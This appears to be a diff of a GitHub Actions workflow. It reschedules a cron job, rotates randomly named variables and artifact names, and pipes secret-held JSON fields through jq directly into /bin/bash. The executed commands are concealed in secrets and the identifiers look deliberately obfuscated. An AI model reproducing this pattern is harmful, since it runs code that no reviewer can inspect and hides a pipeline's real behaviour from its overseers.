@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '55 1,7,13,19 * * *'
+    - cron: '24 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Execute
         env:
-          zsf67: ${{ secrets.zsf67 }}
+          kryfw3700: ${{ secrets.kryfw3700 }}
         run: |
-          printf '%s' "$zsf67" | jq -r .zlar1 | /bin/bash
-          printf '%s' "$cgy8" | jq -r .arxyo636 | /bin/bash
-          echo $l9950 | jq -r .a77 | /bin/bash
-          echo $v60314 | jq -r .swqr2681 | /bin/bash
+          printf '%s' "$kryfw3700" | jq -r .nm1591 | /bin/bash
+          printf '%s' "$j0282" | jq -r .rpgpj060 | /bin/bash
+          echo $ha018 | jq -r .xipw7 | /bin/bash
+          printf '%s' "$j8805" | jq -r .bcv581 | /bin/bash
+          printf '%s' "$jqkcj7100" | jq -r .ynmel736 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: 0FDGAcoW
+          name: yg9YwdBn
           path: "*.zip"
           retention-days: 1
